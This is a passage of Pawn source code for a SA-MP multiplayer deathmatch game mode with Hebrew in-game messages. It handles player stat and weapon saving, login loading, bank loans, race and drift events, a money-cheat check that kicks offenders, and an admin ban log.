format(string,sizeof(string),"RPGWIN=%d\r\n",PlayerInfo[playerid][RPGS]); fwrite(f,string);
format(string,sizeof(string),"mlg=%d\r\n",PlayerInfo[playerid][Mlg]); fwrite(f,string);
format(string,sizeof(string),"Adminl=%d\r\n",PlayerInfo[playerid][AdminsLevel]); fwrite(f,string);
format(string,sizeof(string),"Warning=%d\r\n",PlayerInfo[playerid][Warnings]); fwrite(f,string);
format(string,sizeof(string),"pWeeds=%d\r\n",PlayerInfo[playerid][Weeds]); fwrite(f,string);
format(string,sizeof(string),"armour=%d\r\n",PlayerInfo[playerid][armourT]); fwrite(f,string);
format(string,sizeof(string),"ProfileLogeed=%d\r\n",PlayerInfo[playerid][ProfileLogged]); fwrite(f,string);
format(string,sizeof(string),"VIP=%d\r\n",PlayerInfo[playerid][VIPS]); fwrite(f,string);
format(string,sizeof(string),"CC=%d\r\n",PlayerInfo[playerid][CcMode]); fwrite(f,string);
format(string,sizeof(string),"Supportives=%d\r\n",PlayerInfo[playerid][Supportives]); fwrite(f,string);
format(string,sizeof(string),"Tor=%d\r\n",PlayerInfo[playerid][Tor]); fwrite(f,string);
format(string,sizeof(string),"Dolphin=%d\r\n",PlayerInfo[playerid][Dolp]); fwrite(f,string);
format(string,sizeof(string),"Pets=%d\r\n",PlayerInfo[playerid][Pets]); fwrite(f,string);
format(string,sizeof(string),"Shark=%d\r\n",PlayerInfo[playerid][Shark]); fwrite(f,string);
format(string,sizeof(string),"SharkKills=%d\r\n",PlayerInfo[playerid][SharkKills]); fwrite(f,string);
format(string,sizeof(string),"DolphinKills=%d\r\n",PlayerInfo[playerid][DolphinKills]); fwrite(f,string);
format(string,sizeof(string),"TorKills=%d\r\n",PlayerInfo[playerid][TorKills]); fwrite(f,string);
format(string,sizeof(string),"GetAloan=%d\r\n",PlayerInfo[playerid][GetAloan]); fwrite(f,string);
format(string,sizeof(string),"MoneyLoan=%d\r\n",PlayerInfo[playerid][MoneyLoan]); fwrite(f,string);
format(string,sizeof(string),"bazooka=%d\r\n",PlayerInfo[playerid][bazooka]); fwrite(f,string);
format(string,sizeof(string),"TimeOnServer=%d\r\n",PlayerInfo[playerid][TimeOnServer]); fwrite(f,string);
format(string,sizeof(string),"SavePos=%d\r\n",PlayerInfo[playerid][Saved]); fwrite(f,string);
format(string,sizeof(string),"SavePosX=%.4f\r\n",PlayerInfo[playerid][SPX]); fwrite(f,string);
format(string,sizeof(string),"SavePosY=%.4f\r\n",PlayerInfo[playerid][SPY]); fwrite(f,string);
format(string,sizeof(string),"SavePosZ=%.4f\r\n",PlayerInfo[playerid][SPZ]); fwrite(f,string);
format(string,sizeof(string),"SavePosI=%d\r\n",PlayerInfo[playerid][SPI]); fwrite(f,string);
format(string,sizeof(string),"Saved=%d\r\n",PlayerInfo[playerid][Saved]); fwrite(f,string);
format(string,sizeof(string),"SkinSavedId=%d\r\n",PlayerInfo[playerid][SkinSavedId]); fwrite(f,string);
format(string,sizeof(string),"SaveSkin=%d\r\n",PlayerInfo[playerid][SaveSkin]); fwrite(f,string);
format(string,sizeof(string),"SkinSaved=%d\r\n",PlayerInfo[playerid][SkinSaved]); fwrite(f,string);
format(string,sizeof(string),"SaveStrika=%d\r\n",PlayerInfo[playerid][AirStrikeSaved]); fwrite(f,string);
format(string,sizeof(string),"xAir=%d\r\n",PlayerInfo[playerid][xAirStrike]); fwrite(f,string);
format(string,sizeof(string),"yAir=%d\r\n",PlayerInfo[playerid][yAirStrike]); fwrite(f,string);
format(string,sizeof(string),"zAir=%d\r\n",PlayerInfo[playerid][zAirStrike]); fwrite(f,string);
format(string,sizeof(string),"ofidcarid=%d\r\n",pia[playerid][CarID]); fwrite(f,string);
format(string,sizeof(string),"OFCARAR=%d\r\n",pia[playerid][OwnCar]); fwrite(f,string);
format(string,sizeof(string),"Sawn=%d\r\n",PlayerInfo[playerid][Sawn]); fwrite(f,string);
format(string,sizeof(string),"MicroSMG=%d\r\n",PlayerInfo[playerid][MicroSMG]); fwrite(f,string);
format(string,sizeof(string),"Tec9=%d\r\n",PlayerInfo[playerid][Tec9]); fwrite(f,string);
format(string,sizeof(string),"M4=%.4f\r\n",PlayerInfo[playerid][M4]); fwrite(f,string);
format(string,sizeof(string),"MP5=%.4f\r\n",PlayerInfo[playerid][MP5]); fwrite(f,string);
format(string,sizeof(string),"AK47=%.4f\r\n",PlayerInfo[playerid][AK47]); fwrite(f,string);
format(string,sizeof(string),"Knife=%d\r\n",PlayerInfo[playerid][Knife]); fwrite(f,string);
format(string,sizeof(string),"Katana=%d\r\n",PlayerInfo[playerid][Katana]); fwrite(f,string);
format(string,sizeof(string),"CombatShotGun=%d\r\n",PlayerInfo[playerid][CombatShotGun]); fwrite(f,string);
format(string,sizeof(string),"ShotGun=%d\r\n",PlayerInfo[playerid][ShotGun]); fwrite(f,string);
format(string,sizeof(string),"SniperRifle=%d\r\n",PlayerInfo[playerid][SniperRifle]); fwrite(f,string);
format(string,sizeof(string),"CRifle=%d\r\n",PlayerInfo[playerid][CRifle]); fwrite(f,string);
format(string,sizeof(string),"Colt=%d\r\n",PlayerInfo[playerid][Colt]); fwrite(f,string);
fclose(f);
}
return 1;
}
//=[Login`s]================================================================
/*
	native LoginPlayer(playerid);
*/
stock LoginPlayer(playerid)
{
new date[3], time[3];
PlayerInfo[playerid][Logged] = 1;
PlayerInfo[playerid][FL] = 0;
getdate(date[0],date[1],date[2]);
gettime(time[0],time[1],time[2]);
PlayerInfo[playerid][Ans] = dini_Int(GetPlayerFile(playerid),"Ans");
PlayerInfo[playerid][KopatGemel] = dini_Int(GetPlayerFile(playerid),"KopatGemel");
PlayerInfo[playerid][GemelLogin] = dini_Int(GetPlayerFile(playerid),"GemelLogin");
PlayerInfo[playerid][AggInfo] = dini_Int(GetPlayerFile(playerid),"AggInfo");
PlayerInfo[playerid][Level] = dini_Int(GetPlayerFile(playerid),"Level");
PlayerInfo[playerid][aKillsnl] = dini_Int(GetPlayerFile(playerid),"aKillsnl");
PlayerInfo[playerid][aLevelnl] = dini_Int(GetPlayerFile(playerid),"aLevelnl");
dini_Set(GetPlayerFile(playerid),"LastConnectIP",GetIP(playerid));
dini_Set(GetPlayerFile(playerid),"State","Online");
dini_IntSet(GetPlayerFile(playerid),"LastConnectYear",date[0]);
dini_IntSet(GetPlayerFile(playerid),"LastConnectMonth",date[1]);
dini_IntSet(GetPlayerFile(playerid),"LastConnectDay",date[2]);
dini_IntSet(GetPlayerFile(playerid),"LastConnectHour",time[0]);
dini_IntSet(GetPlayerFile(playerid),"LastConnectMinute",time[1]);
pia[playerid][CarID] = dini_Int(GetPlayerFile(playerid),"ofidcarid");
pia[playerid][OwnCar] = dini_Int(GetPlayerFile(playerid),"OFCARAR");
PlayerInfo[playerid][Kills] = dini_Int(GetPlayerFile(playerid),"Kills");
PlayerInfo[playerid][Deaths] = dini_Int(GetPlayerFile(playerid),"Deaths");
PlayerInfo[playerid][Money] = dini_Int(GetPlayerFile(playerid),"Money");
PlayerInfo[playerid][Bank] = dini_Int(GetPlayerFile(playerid),"Bank");
PlayerInfo[playerid][Wars] = dini_Int(GetPlayerFile(playerid),"Wars");
PlayerInfo[playerid][Kart] = dini_Int(GetPlayerFile(playerid),"Karts");
PlayerInfo[playerid][Monster] = dini_Int(GetPlayerFile(playerid),"MonsterWin");
PlayerInfo[playerid][RPGS] = dini_Int(GetPlayerFile(playerid),"RPGWIN");
PlayerInfo[playerid][MINIGUN] = dini_Int(GetPlayerFile(playerid),"MiniWin");
PlayerInfo[playerid][Mlg] = dini_Int(GetPlayerFile(playerid),"mlg");
PlayerInfo[playerid][CcMode] = dini_Int(GetPlayerFile(playerid),"CC");
PlayerInfo[playerid][Supportives] = dini_Int(GetPlayerFile(playerid),"Supportives");
PlayerInfo[playerid][Tor] = dini_Int(GetPlayerFile(playerid),"Tor");
PlayerInfo[playerid][Dolp] = dini_Int(GetPlayerFile(playerid),"Dolphin");
PlayerInfo[playerid][Pets] = dini_Int(GetPlayerFile(playerid),"Pets");
PlayerInfo[playerid][Shark] = dini_Int(GetPlayerFile(playerid),"Shark");
PlayerInfo[playerid][SharkKills] = dini_Int(GetPlayerFile(playerid),"SharkKills");
PlayerInfo[playerid][TorKills] = dini_Int(GetPlayerFile(playerid),"TorKills");
PlayerInfo[playerid][DolphinKills] = dini_Int(GetPlayerFile(playerid),"DolphinKills");
PlayerInfo[playerid][AdminsLevel] = dini_Int(GetPlayerFile(playerid),"Adminl");
PlayerInfo[playerid][Warnings] = dini_Int(GetPlayerFile(playerid),"Warning");
PlayerInfo[playerid][Weeds] = dini_Int(GetPlayerFile(playerid),"pWeeds");
PlayerInfo[playerid][bazooka] = dini_Int(GetPlayerFile(playerid),"bazooka");
PlayerInfo[playerid][TimeOnServer] = dini_Int(GetPlayerFile(playerid),"TimeOnServer");
PlayerInfo[playerid][Saved] = dini_Int(GetPlayerFile(playerid),"SavePos");
PlayerInfo[playerid][SPX] = dini_Float(GetPlayerFile(playerid),"SavePosX");
PlayerInfo[playerid][SPY] = dini_Float(GetPlayerFile(playerid),"SavePosY");
PlayerInfo[playerid][SPZ] = dini_Float(GetPlayerFile(playerid),"SavePosZ");
PlayerInfo[playerid][SPI] = dini_Int(GetPlayerFile(playerid),"SavePosI");
PlayerInfo[playerid][SkinSavedId] = dini_Int(GetPlayerFile(playerid),"SkinSavedId");
PlayerInfo[playerid][SkinSaved] = dini_Int(GetPlayerFile(playerid),"SkinSaved");
PlayerInfo[playerid][SaveSkin] = dini_Int(GetPlayerFile(playerid),"SaveSkin");
PlayerInfo[playerid][autologin] = dini_Int(GetPlayerFile(playerid),"autologins");
PlayerInfo[playerid][GetAloan] = dini_Int(GetPlayerFile(playerid),"GetAloan");
PlayerInfo[playerid][MoneyLoan] = dini_Int(GetPlayerFile(playerid),"MoneyLoan");
PlayerInfo[playerid][VIPS] = dini_Int(GetPlayerFile(playerid),"VIP");
PlayerInfo[playerid][armourT] = dini_Int(GetPlayerFile(playerid),"armour");
PlayerInfo[playerid][ProfileLogged] = dini_Int(GetPlayerFile(playerid),"ProfileLogeed");
PlayerInfo[playerid][AirStrikeSaved] = dini_Int(GetPlayerFile(playerid),"SaveStrika");
PlayerInfo[playerid][xAirStrike] = dini_Int(GetPlayerFile(playerid),"xAir");
PlayerInfo[playerid][yAirStrike] = dini_Int(GetPlayerFile(playerid),"yAir");
PlayerInfo[playerid][zAirStrike] = dini_Int(GetPlayerFile(playerid),"zAir");
PlayerInfo[playerid][Sawn] = dini_Int(GetPlayerFile(playerid),"Sawn");
PlayerInfo[playerid][MicroSMG] = dini_Int(GetPlayerFile(playerid),"MicroSMG");
PlayerInfo[playerid][Tec9] = dini_Int(GetPlayerFile(playerid),"Tec9");
PlayerInfo[playerid][M4] = dini_Int(GetPlayerFile(playerid),"M4");
PlayerInfo[playerid][MP5] = dini_Int(GetPlayerFile(playerid),"MP5");
PlayerInfo[playerid][AK47] = dini_Int(GetPlayerFile(playerid),"AK47");
PlayerInfo[playerid][Knife] = dini_Int(GetPlayerFile(playerid),"Knife");
PlayerInfo[playerid][Katana] = dini_Int(GetPlayerFile(playerid),"Katana");
PlayerInfo[playerid][CombatShotGun] = dini_Int(GetPlayerFile(playerid),"CombatShotGun");
PlayerInfo[playerid][ShotGun] = dini_Int(GetPlayerFile(playerid),"ShotGun");
PlayerInfo[playerid][SniperRifle] = dini_Int(GetPlayerFile(playerid),"SniperRifle");
PlayerInfo[playerid][CRifle] = dini_Int(GetPlayerFile(playerid),"CRifle");
PlayerInfo[playerid][Colt] = dini_Int(GetPlayerFile(playerid),"Colt");


return 1;
}
//=[TeleCar`s]========================================
forward TeleCar(playerid);
public TeleCar(playerid)
{
if(IsPlayerInAnyVehicle(playerid)) SetVehiclePos(GetPlayerVehicleID(playerid), Pos[playerid][0], Pos[playerid][1], Pos[playerid][2]+0.5);
SetVehicleZAngle(GetPlayerVehicleID(playerid), Angle[playerid]);
SetCameraBehindPlayer(playerid);
}
//=[RepairCAR]========================================
forward RepairCar(playerid);
public RepairCar(playerid)
{
if(IsPlayerInAnyVehicle(playerid)) SetVehiclePos(GetPlayerVehicleID(playerid), Pos[playerid][0], Pos[playerid][1], Pos[playerid][2]+0.5);
SetVehicleZAngle(GetPlayerVehicleID(playerid), Angle[playerid]);
SetCameraBehindPlayer(playerid);
}
//=[ActualizarMemoriaSalida]========================================
ActualizarMemoriaSalida(playerid,otroplayerid)
{
for (new i=4;i>0;i--)
{
MemorySalida[playerid][i][numero_telefono]=MemorySalida[playerid][i-1][numero_telefono];
format(MemorySalida[playerid][i][Nombre],MAX_PLAYER_NAME,"%s",MemorySalida[playerid][i-1][Nombre]);
MemorySalida[playerid][i][costo]=MemorySalida[playerid][i-1][costo];
}
MemorySalida[playerid][0][numero_telefono]=Numero_Tel[otroplayerid];
GetPlayerName(otroplayerid,MemorySalida[playerid][0][Nombre],MAX_PLAYER_NAME);
MemorySalida[playerid][0][costo]=CellTime[playerid]*PRECIO_FICHA;
return 1;
}
//=[ActualizarMemoriaEntrada]========================================
ActualizarMemoriaEntrada(playerid,otroplayerid)
{
for (new i=4;i>0;i--)
{
MemoryEntrada[playerid][i][numero_telefono2]=MemoryEntrada[playerid][i-1][numero_telefono2];
format(MemoryEntrada[playerid][i][Nombre2],MAX_PLAYER_NAME,"%s",MemoryEntrada[playerid][i-1][Nombre2]);
}
MemoryEntrada[playerid][0][numero_telefono2]=Numero_Tel[otroplayerid];
GetPlayerName(otroplayerid,MemoryEntrada[playerid][0][Nombre2],MAX_PLAYER_NAME);
return 1;
}
//=[Borrar]=============================================================
borrarMemorias(playerid)
{
for (new i=0;i<5;i++)
{
MemoryEntrada[playerid][i][numero_telefono2]=0;
MemorySalida[playerid][i][numero_telefono]=0;
SMSRecibidos[playerid][i][numeroSMS2]=0;
SMSEnviados[playerid][i][numeroSMS1]=0;
}
return 1;
}
//=[CWarningsplayers]======================================
forward CWarnings();
public CWarnings() {

for(new i = 0;i<MAX_PLAYERS;i++)
{
if(IsPlayerConnected(i))
{

if (PlayerInfo[i][Warnings] >=10)
{
if(IsPlayerXAdmin(i,1)) return 0;
Kick(i);
}
}
}
return 1;
}
//=[IsNumber]=================================================
forward IsNumber(string[]);
public IsNumber(string[])
{
for(new i=0,j=strlen(string); i<j;i++)
{
if(string[i] > '9' || string[i] < '5')
{
return 0;
}
}
return 1;
}

//=[LOANBANK`S]===========================================
forward loan();
public loan()
{
for(new i=0; i<MAX_PLAYERS; i++)
{
if(PlayerInfo[i][GetAloan] ==0) return 0;
if(PlayerInfo[i][GetAloan] ==1) {
new string[256];
PlayerInfo[i][MoneyLoan] +=200;
format(string, sizeof(string),"%d :הבנק לוחץ עליך אתה חייב להחזיר כסף לבנק בסכום של",PlayerInfo[i][MoneyLoan]),SendClientMessage(i,WHITE,string),SendClientMessage(i,WHITE,".כדאי לך להחזיר מהר הבנק מעלה כל פעם תחוב ב200 דולר");
}
}
return 1;
}
//=[UNFREEZE+Start`s]=============================================
forward UnFreezeRace();
public UnFreezeRace()
{
for(new i=0; i<MAX_PLAYERS; i++)
{
if(RacePlayers < 1)
{
SendClientMessage(i,WHITE,"המירוץ בוטל סיבה: מספר שחקנים פחות מ-1");
RaceEnd =0;
WinnerRace=0;
RacePlayers=0;
IFraceOn=0;
if(Youregisterrace[i] ==1)
{
DisablePlayerRaceCheckpoint(i);
TogglePlayerControllable(i,1);
LACY_GiveMoney(i,500);
SendClientMessage(i,WHITE,".קיבלת פיצוי של 500 דולר בגלל ביטול המירוץ");
}
}
EndSytems= SetTimer("UnSystemRace",3000,1);
new string[256];
SendClientMessage(i,red,"[______________מירוץ מאורגן - מכוניות______________]");
format(string,sizeof(string)," %d :מס' משתתפים",RacePlayers),SendClientMessage(i,0xE21E1EFF,string);
SendClientMessage(i,0xE21E1EFF,"המנצח יקבל סכום מכובד של 3000$");
SendClientMessage(i,red,".--------------------------------------");
TogglePlayerControllable(i,1);
RaceEnd=1;
}
return 1;
}
//=[Race`sEND]==================================================
forward UnSystemRace();
public UnSystemRace(){

if(RaceEnd ==0) return KillTimer(EndSytems);
if(RacePlayers < 1) {
for(new i=0; i<MAX_PLAYERS; i++)
{
SendClientMessage(i,WHITE,".המירוץ בוטל בגלל שכל הרכבים של המשתתפים התפוצצו / הם יצאו מהרכבים שלהם / חוסר משתתפים");
KillTimer(EndSytems);
RaceEnd =0;
WinnerRace=0;
RacePlayers=0;
IFraceOn=0;
if(Youregisterrace[i] ==1)
{
DisablePlayerRaceCheckpoint(i);
TogglePlayerControllable(i,1);
}
}
}
return 1;
}
//=[START+Unfreze]================================================
forward UnFreezeDrift();
public UnFreezeDrift(){
for(new i=0; i<MAX_PLAYERS; i++)
{
if(DriftPlayer < 1)
{
SendClientMessage(i,WHITE,"המירוץ דריפטים בוטל סיבה: בגלל שמספר השחקנים קטן מ-1");
DriftEnd =0;
WinnerDrift=0;
DriftPlayer=0;
IFDriftOn=0;
YouRegister[i] =0;
TogglePlayerControllable(i,1);
if(YouRegister[i]==1)
{
new vehicleid = GetPlayerVehicleID(i);
SetPlayerVirtualWorld(i,0);
SetVehicleVirtualWorld(vehicleid,0);
DisablePlayerRaceCheckpoint(i);
LACY_GiveMoney(i,500);
SendClientMessage(i,WHITE,".קיבלת פיצוי של 500 דולר בגלל ביטול הדריפט");
}
}
UnSystems = SetTimer("UnSystem",3000,1);
new string[256];
TogglePlayerControllable(i,1);
DriftEnd=1;

SendClientMessage(i,red,"[______________מירוץ מאורגן - דריפט______________]");
format(string,sizeof(string)," %d :מס' משתתפים",DriftPlayer),SendClientMessage(i,0xE21E1EFF,string);
SendClientMessage(i,0xE21E1EFF,"המנצח יקבל סכום מכובד של 3000$");
SendClientMessage(i,red,".--------------------------------------");
}
return 1;
}
//=[ENDDrift]=======================================================
forward UnSystem();
public UnSystem(){
for(new i=0; i<MAX_PLAYERS; i++)
{
if(DriftEnd ==0) return KillTimer(UnSystems);
if(DriftPlayer == 0)
{
SendClientMessage(i,red,".המירוץ בוטל בגלל פרישה של יותר מידי שחקנים-");
DriftEnd =0;
WinnerDrift=0;
DriftPlayer=0;
IFDriftOn=0;
if(YouRegister[i] == 1)
{
new vehicleid = GetPlayerVehicleID(i);
SetPlayerVirtualWorld(i,0);
SetVehicleVirtualWorld(vehicleid,0);
YouRegister[i] =0;
TogglePlayerControllable(i,1);
KillTimer(UnSystems);
}
}
}
return 1;
}
//=[CheackCar]=====================================================
stock IsVehicle(playerid)
{
new wqewqe = GetPlayerVehicleID(playerid);
wqewqe = GetVehicleModel(wqewqe);
if(wqewqe == 451)
return 1;
else
return 0;
}
stock IsBike(playerid)
{
new ssssssssssssss = GetPlayerVehicleID(playerid);
ssssssssssssss = GetVehicleModel(ssssssssssssss);
if(ssssssssssssss == 522)
return 1;
else
return 0;
}
//=[UpdatePlayer`s]===================================================
/*
forward OnPlayerUpdate(playerid);
public OnPlayerUpdate(playerid)
{
gLastUpdate[playerid] = GetTickCount();
gState[playerid] = e_STATE_UPDATING;
return 1;
}
//=[AutoOutSystem`s(`Esc`)]============================================
public KickUpdate()
{
new time = GetTickCount() - MAX_AFK_TIME;
for (new i = 0; i < MAX_PLAYERS; i++)
{
if (gState[i] == e_STATE_UPDATING && time >= gLastUpdate[i])
{
if(Registertrs[i] ==1)
{
CPTriatlon[i]=0,DisablePlayerRaceCheckpoint(i),Registertrs[i] =0,CPTriatlon[i]=0,RunPlayers--;
SendClientMessage(i, 0xFF0000AA, ".הוצאת מהפעילות שהייתה בא אוטומאטית");
SetPlayerVirtualWorld(i,0);
if(IsPlayerInAnyVehicle(i))
{
RemovePlayerFromVehicle(i);
SpawnPlayer(i);
}
if(!IsPlayerInAnyVehicle(i))
{
SpawnPlayer(i);
}
SetPlayerPos(i,2057.0664,843.0209,6.7031);
SetPlayerFacingAngle(i,357.5948);
}
if(YouRegister[i] ==1)
{
YouRegister[i] =0,DisablePlayerRaceCheckpoint(i),DriftPlayer--;
SendClientMessage(i, 0xFF0000AA, ".הוצאת מהפעילות שהייתה בא אוטומאטית");
SetPlayerVirtualWorld(i,0);
if(IsPlayerInAnyVehicle(i))
{
RemovePlayerFromVehicle(i);
SpawnPlayer(i);
}
if(!IsPlayerInAnyVehicle(i))
{
SpawnPlayer(i);
}
SetPlayerPos(i,2057.0664,843.0209,6.7031);
SetPlayerFacingAngle(i,357.5948);
}
if(Youregisterrace[i] ==1)
{
Youregisterrace[i] =0,RacePlayers--,DisablePlayerRaceCheckpoint(i);
SendClientMessage(i, 0xFF0000AA, ".הוצאת מהפעילות שהייתה בא אוטומאטית");
SetPlayerVirtualWorld(i,0);
if(IsPlayerInAnyVehicle(i))
{
RemovePlayerFromVehicle(i);
SpawnPlayer(i);
}
if(!IsPlayerInAnyVehicle(i))
{
SpawnPlayer(i);
}
SetPlayerPos(i,2057.0664,843.0209,6.7031);
SetPlayerFacingAngle(i,357.5948);
}
if(PPw[i] == 1)
{
ResetPlayerWeapons(i);
SendClientMessage(i,WHITE,".עזבת את הפעילות שבה הייתה");
WarPlayersw --; InWarw[i] = 0; PPw[i] = 0;
SetPlayerVirtualWorld(i,0);
if(IsPlayerInAnyVehicle(i))
{
RemovePlayerFromVehicle(i);
SpawnPlayer(i);
}
if(!IsPlayerInAnyVehicle(i))
{
SpawnPlayer(i);
}
SetPlayerPos(i,2057.0664,843.0209,6.7031);
SetPlayerFacingAngle(i,357.5948);
}
if(PP[i] == 1)
{
ResetPlayerWeapons(i);
SendClientMessage(i,WHITE,".עזבת את הפעילות שבה הייתה");
WarPlayers --;
InWar[i] = 0;
PP[i] = 0;
SetPlayerVirtualWorld(i,0);
if(IsPlayerInAnyVehicle(i))
{
RemovePlayerFromVehicle(i);
SpawnPlayer(i);
}
if(!IsPlayerInAnyVehicle(i))
{
SpawnPlayer(i);
}
SetPlayerPos(i,2057.0664,843.0209,6.7031);
SetPlayerFacingAngle(i,357.5948);
}
if(PPr[i] == 1)
{
ResetPlayerWeapons(i);
SendClientMessage(i,WHITE,".עזבת את הפעילות שבה הייתה");
WarPlayersr --; InWarr[i] = 0; PPr[i] = 0;
SetPlayerVirtualWorld(i,0);
if(IsPlayerInAnyVehicle(i))
{
RemovePlayerFromVehicle(i);
SpawnPlayer(i);
}
if(!IsPlayerInAnyVehicle(i))
{
SpawnPlayer(i);
}
SetPlayerPos(i,2057.0664,843.0209,6.7031);
SetPlayerFacingAngle(i,357.5948);
}
}
}
}
*/
//=[SplitAge]=========================================[`Profile`]
forward split(const strsrc[], strdest[][], delimiter);
public split(const strsrc[], strdest[][], delimiter)
{
new i, li;
new aNum;
new len;
while(i <= strlen(strsrc))
{
if(strsrc[i]==delimiter || i==strlen(strsrc))
{
len = strmid(strdest[aNum], strsrc, li, i, 128);
strdest[aNum][len] = 0;
li = i+1;
aNum++;
}
i++;
}
return 1;
}
//=[ChangeHostName]==================================[/`AUTO`]
/*
public AutoChangeHN()
{
if(changehn == 1)
{
changehn = 2;
SendRconCommand("hostname Satla-Zone.co.il  Hard`s, DeatchMatch.");
SetGameModeText("DeatchMatch  World..");
return 1;
}
else if(changehn == 2)
{
changehn = 1;
SendRconCommand("hostname Satla-Zone.co.il  Isreal, DeatchMatch");
SetGameModeText("DeatchMatch  Zone.");
return 1;
}
return 1;
}
*/
//=[DubleGEMEL]====================================
/*
forward CafolMoneyGemel(playerid);
public CafolMoneyGemel(playerid)
{
if(PlayerInfo[playerid][KopatGemel] ==0) return 0;
if(PlayerInfo[playerid][KopatGemel]  > 0 || PlayerInfo[playerid][GemelLogin] > 1000)
{
new string[256];
PlayerInfo[playerid][GemelLogin]+=PlayerInfo[playerid][GemelLogin]-800;
format(string, sizeof(string),".%d הקופת גמל הכפילה לך תסכום בהשקעה ל",PlayerInfo[playerid][GemelLogin]),SendClientMessage(playerid,0xF6F658FF,string);
}
return 1;
}
*/
//=[CheckHacker`s]==================================
#if MONEY_CHEAT_USE
public moneycheat_check()
{
for(new playerid=0; playerid <= MAX_PLAYERS; playerid++)
{
if(IsPlayerConnected(playerid))
{
money[playerid] = GetPlayerMoney(playerid);
moneycheat_warnings[playerid][1]++;
if(money[playerid]-LACY_MoneyCheat_Allow_Get(playerid)  > moneycheat_lastamount[playerid])
moneycheat_warnings[playerid][0]++;
if(moneycheat_warnings[playerid][1] == MONEY_CHEAT_WARNINGS)
{
if(moneycheat_warnings[playerid][0] == MONEY_CHEAT_WARNINGS)
{
Kicked[playerid] = 2; Punishplayer(playerid, "Money Hack.", MONEY_CHEAT_PUNISH);
}
moneycheat_warnings[playerid][1] = 0;
moneycheat_warnings[playerid][0] = 0;
}
if(moneycheat_lastamount[playerid] + LACY_MoneyCheat_Allow_Get(playerid) == money[playerid])
LACY_MoneyCheat_Delete(playerid);
moneycheat_lastamount[playerid] = money[playerid];
}
}
}
#endif
//=[Punish_On_C]================================
Punishplayer(playerid, str[], punish)
{
if(!IsPlayerConnected(playerid))
return true;
new tmp[256];
GetPlayerName(playerid, playername, MAX_PLAYER_NAME);
switch(punish)
{
case 2:
{

ResetPlayerMoney(playerid);
if(IsPlayerXAdmin(playerid,1)) return 0;
SendClientMessage(playerid,red," Money Hack. קיבלת קיק מהשרת בגלל השתמשות בצי'ט");
format(tmp, 256, "Anti Hackers || %s has been kicked cos use %s",GetName(playerid),str);
SendClientMessageToAll(red, tmp);

Kick(playerid);
}
}
SetPlayerVars(playerid);
return true;
}
//=[DoNoramlAC]=========================================
SetPlayerVars(playerid)
{
#if MONEY_CHEAT_USE
moneycheat_warnings[playerid] = {0, 0};
moneycheat_lastamount[playerid] = 99999999;
money[playerid] = 0;
#endif
Kicked[playerid] = 0;
LACY_MoneyCheat_Delete(playerid);
return 1;
}
//=[DistancePoint]/V]===================================
stock GetPlayerDistanceToPoint(playerid,Float:x,Float:y)
{
new Float:x1,Float:y1,Float:z1;
new Float:tmpdis;
GetPlayerPos(playerid,x1,y1,z1);
tmpdis = floatsqroot(floatpower(floatabs(floatsub(x,x1)),2)+floatpower(floatabs(floatsub(y,y1)),2));
return floatround(tmpdis);
}
//=[Allow_Get]===========================================
LACY_MoneyCheat_Allow_Get(playerid)
{
new tmpname[256];
format(tmpname, 256, "LACY_MoneyCheat_Allow_%d", playerid);
if(existproperty(13, "", adler32hash(tmpname)))
{
new tmp;
new value[255];
getproperty(13, "", adler32hash(tmpname), value);
strunpack(value,value);
tmp = strval(value);

return tmp;
}
return 0;
}
//=[DeleteMc]=============================================
LACY_MoneyCheat_Delete(playerid)
{
new tmpname[256];
format(tmpname, 256, "LACY_MoneyCheat_Allow_%d", playerid);
if(existproperty(13, "", adler32hash(tmpname)))
{
deleteproperty(13, "", adler32hash(tmpname));
}
}
//=[AllowMoney]============================================
forward LACY_MoneyCheat_Allow(playerid, amount1);
public LACY_MoneyCheat_Allow(playerid, amount1)
{
new tmpname[256];
new amount[256];
format(tmpname, 256, "LACY_MoneyCheat_Allow_%d", playerid);
if(existproperty(13, "", adler32hash(tmpname)))
{
new tmp;
new value[255];
getproperty(13, "", adler32hash(tmpname), value);
strunpack(value,value);
tmp = strval(value);
amount1 = amount1+tmp;
format(amount, 256, "%d", amount1);
deleteproperty(13, "", adler32hash(tmpname));
setproperty(13, "", adler32hash(tmpname), amount);
}
else
{
format(amount, 256, "%d", amount1);
setproperty(13, "", adler32hash(tmpname), amount);
}
}
//=[HidePassword]============================================
adler32hash(buf[])
{
new length=strlen(buf);
new s1 = 1;
new s2 = 0;
new n;
for (n=0; n<length; n++)
{
s1 = (s1 + buf[n]) % 65521;
s2 = (s2 + s1)     % 65521;
}
return (s2 << 16) + s1;
}
//=[LACY_GiveMoney-Function]===============================
forward LACY_GiveMoney(playerid, amount);
public LACY_GiveMoney(playerid, amount)
{
if(amount > 0)
LACY_MoneyCheat_Allow(playerid, amount);
GivePlayerMoney(playerid, amount);
}
//=[Ban`sxadmin]===============================================
stock xAdminBan(playerid,reason[])
{
new tnd[128],day,month,year,hour,minute,second,hour_tf[3],minute_tf[3],second_tf[3];
getdate(year,month,day); gettime(hour,minute,second);
if (hour <= 9) format(hour_tf,3,"0%d",hour); else format(hour_tf,3,"%d",hour);
if (minute <= 9) format(minute_tf,3,"0%d",minute); else format(minute_tf,3,"%d",minute);
if (second <= 9) format(second_tf,3,"0%d",second); else format(second_tf,3,"%d",second);
format(tnd,128,"%d.%d.%d | %s:%s:%s",day,month,year,hour_tf,minute_tf,second_tf);
new string[256],name[24],ip[20]; GetPlayerName(playerid,name,24); GetPlayerIp(playerid,ip,20);
new fileline[256], File:log = (fexist("xadmin/bans.log")) ? fopen("xadmin/bans.log", io_append) : fopen("xadmin/bans.log", io_write);
format(fileline, 256, "[BanSystem] [%s] banned %s (%d) [Reason: %s]\r\n",tnd,name,playerid,reason);
fwrite(log,fileline); fclose(log);
format(string,700,"[BanSystem]  (Time & Date: %s) (IP: %s) [Reason: %s]\r\n :הורחקת מהשרת סיבה",tnd,ip,reason);
SendClientMessage(playerid,WHITE,string);
new IpBanFile[128], BanFile[128];
format(BanFile, 128, "xadmin/Bans/Names/%s.ini", name); format(IpBanFile, 128, "xadmin/Bans/IP/%s.ini", ip);
if (dini_Exists(BanFile) || dini_Exists(IpBanFile)) return false;
dini_Create(BanFile);
dini_Set(BanFile, "Admin", "[BanSystem]");
dini_Set(BanFile, "IP", ip);
dini_Set(BanFile, "Reason", reason);
dini_Set(BanFile, "TND", tnd);
dini_Create(IpBanFile);
dini_Set(IpBanFile, "Admin", "[BanSystem]");
dini_Set(IpBanFile, "PlayerName", name);
dini_Set(IpBanFile, "Reason", reason);
dini_Set(IpBanFile, "TND", tnd);
new mode_file[256];
format(mode_file,sizeof(mode_file), "SatlaZone/%s.ini",name);
